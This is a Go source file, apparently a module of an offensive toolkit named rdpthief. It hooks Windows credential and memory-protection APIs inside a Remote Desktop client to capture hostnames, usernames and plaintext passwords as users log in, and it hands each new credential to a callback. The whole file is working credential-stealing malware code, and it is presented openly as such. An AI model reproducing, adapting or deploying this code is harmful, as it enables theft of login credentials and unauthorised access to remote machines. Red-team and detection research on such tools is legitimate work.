// +build windows

package rdpthief

import (
	"crypto/sha256"
	"reflect"
	"runtime"
	"sync"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/sys/windows"

	"project/internal/convert"
	"project/internal/module/windows/hook"
)

// this module support Windows 7, Windows 8 and Windows 10.

// hook list
// sechost.dll   CredReadW                   ---read hostname
// sechost.dll   CredIsMarshaledCredentialW  ---read username
// crypt32.dll   CryptProtectMemory          ---read password

// Hook is the core library for steal credential.
type Hook struct {
	callback func(cred *Credential)

	pgCredReadW                  *hook.PatchGuard
	pgCryptProtectMemory         *hook.PatchGuard
	pgCredIsMarshaledCredentialW *hook.PatchGuard

	hostname string
	password string

	// prevent record the same credential
	lastCredHash [sha256.Size]byte

	mu sync.Mutex
}

// NewHook is used to create a hook that include a callback.
// <security:> usually cover password string in callback function.
func NewHook(callback func(cred *Credential)) *Hook {
	return &Hook{callback: callback}
}

// Install is used to install hook.
func (h *Hook) Install() error {
	h.mu.Lock()
	defer h.mu.Unlock()

	var hookFn interface{}
	hookFn = h.credReadW
	pg, err := hook.NewInlineHookByName("advapi32.dll", "CredReadW", true, hookFn)
	if err != nil {
		return err
	}
	h.pgCredReadW = pg

	hookFn = h.cryptProtectMemory
	pg, err = hook.NewInlineHookByName("crypt32.dll", "CryptProtectMemory", true, hookFn)
	if err != nil {
		return err
	}
	h.pgCryptProtectMemory = pg

	hookFn = h.credIsMarshaledCredentialW
	pg, err = hook.NewInlineHookByName("advapi32.dll", "CredIsMarshaledCredentialW", true, hookFn)
	if err != nil {
		return err
	}
	h.pgCredIsMarshaledCredentialW = pg
	return nil
}

// Uninstall is used to uninstall hook.
func (h *Hook) Uninstall() error {
	h.mu.Lock()
	defer h.mu.Unlock()

	err := h.pgCredIsMarshaledCredentialW.UnPatch()
	if err != nil {
		return err
	}
	err = h.pgCryptProtectMemory.UnPatch()
	if err != nil {
		return err
	}
	err = h.pgCredReadW.UnPatch()
	if err != nil {
		return err
	}
	return nil
}

// Clean is used to clean callback.
func (h *Hook) Clean() {
	h.callback = nil
}

func (h *Hook) credReadW(targetName *uint16, typ, flags uint, credential uintptr) (ret uintptr) {
	h.mu.Lock()
	defer h.mu.Unlock()

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	defer func() {
		ret, _, _ = h.pgCredReadW.Original.Call(
			uintptr(unsafe.Pointer(targetName)), uintptr(typ), uintptr(flags), credential,
		)
	}()

	hostname := windows.UTF16PtrToString(targetName)
	if hostname != "" {
		h.hostname = hostname
	}
	return
}

func (h *Hook) cryptProtectMemory(address *byte, size, flags uint) (ret uintptr) {
	h.mu.Lock()
	defer h.mu.Unlock()

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	defer func() {
		ret, _, _ = h.pgCryptProtectMemory.Original.Call(
			uintptr(unsafe.Pointer(address)), uintptr(size), uintptr(flags),
		)
	}()

	// skip data that not contain password
	// 0000  02 00 00 00 fc 7f 00 00 00 00 00 00 00 00 00 00  ................
	// 0010  40 00 00 00 00 00 00 00 06 00 06 00 f7 01 00 00  @...............
	// 0020  40 00 00 00 00 00 00 00 5c 00 5c 00 00 00 00 00  @.......\.\.....
	// 0030  46 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  F...............
	// 0040  61 00 63 00 67 00 40 00 40 00 44 00 07 00 08 00  a.c.g.@.@.D.....
	// 0050  0c 00 0a 00 0d 00 59 00 41 00 41 00 41 00 41 00  ......Y.A.A.A.A.
	// 0060  41 00 2d 00 4f 00 42 00 42 00 41 00 41 00 41 00  A.-.O.B.B.A.A.A.
	// 0070  41 00 41 00 41 00 41 00 4a 00 77 00 77 00 31 00  A.A.A.A.J.w.w.1.
	// 0080  53 00 56 00 41 00 59 00 45 00 32 00 71 00 6d 00  S.V.A.Y.E.2.q.m.
	// 0090  2d 00 62 00 62 00 34 00 42 00 46 00 36 00 59 00  -.b.b.4.B.F.6.Y.
	// 00a0  75 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  u...............
	if *address == 2 && size != 16 {
		return
	}

	var data []byte
	sh := (*reflect.SliceHeader)(unsafe.Pointer(&data))
	sh.Data = uintptr(unsafe.Pointer(address))
	sh.Len = int(size)
	sh.Cap = int(size)

	// check is valid password
	passwordLen := convert.LEBytesToUint32(data[:4])

	// invalid password
	// 0000  e2 9f 0e ca ab d9 dc e5 84 a7 82 df 0f 85 e1 85  ................
	// 0010  af 42 89 e9 2b e3 d6 bf 38 dc 0a 94 8d 7f 5f 20  .B..+...8....._
	// 0020  95 92 f8 24 13 1c 21 86 9d 3b e4 2c 34 0e e1 bb  ...$..!..;.,4...
	// 0030  2f e9 06 cf 13 7e 87 a8 b0 2b 59 26 a8 5a 41 43  /....~...+Y&.ZAC
	// 0040  f1 61 a4 89 39 f7 1e d0 12 f6 78 24 ab 6a e5 0d  .a..9.....x$.j..
	// 0050  0d 75 9b 82 18 b0 76 d3 38 68 80 05 b2 b1 33 b1  .u....v.8h....3.
	// 0060  03 30 95 59 4f 37 61 7c c6 ab b8 76 95 e6 ef 97  .0.YO7a|...v....
	// 0070  f1 6c ab 06 27 be 4a e9 d2 37 9f 2e 56 59 c4 b6  .l..'.J..7..VY..
	// 0080  54 87 1e f5 1e e9 cc 37 82 da d0 d5 66 21 d9 31  T......7....f!.1
	// 0090  ba 55 51 9b 0d bd 47 af 21 b8 07 72 bc a3 72 9f  .UQ...G.!..r..r.
	if uint(passwordLen) > size-4 {
		return
	}

	// valid password
	// 0000  0c 00 00 00 61 00 63 00 67 00 61 00 73 00 64 00  ....a.c.g.a.s.d.

	password := make([]byte, passwordLen)
	copy(password, data[4:4+passwordLen])

	sh = (*reflect.SliceHeader)(unsafe.Pointer(&password))
	sh.Len = sh.Len / 2
	sh.Cap = sh.Cap / 2

	h.password = string(utf16.Decode(*(*[]uint16)(unsafe.Pointer(&password))))
	return
}

func (h *Hook) credIsMarshaledCredentialW(marshaledCredential *uint16) (ret uintptr) {
	h.mu.Lock()
	defer h.mu.Unlock()

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	defer func() {
		ret, _, _ = h.pgCredIsMarshaledCredentialW.Original.Call(
			uintptr(unsafe.Pointer(marshaledCredential)),
		)
	}()

	username := windows.UTF16PtrToString(marshaledCredential)
	if username == "" || h.password == "" {
		return
	}
	// compare with the last credential
	hash := sha256.Sum256([]byte(h.hostname + username + h.password))
	if hash != h.lastCredHash {
		h.callback(&Credential{
			Hostname: h.hostname,
			Username: username,
			Password: h.password,
		})
		h.lastCredHash = hash
	}
	h.password = ""
	return
}
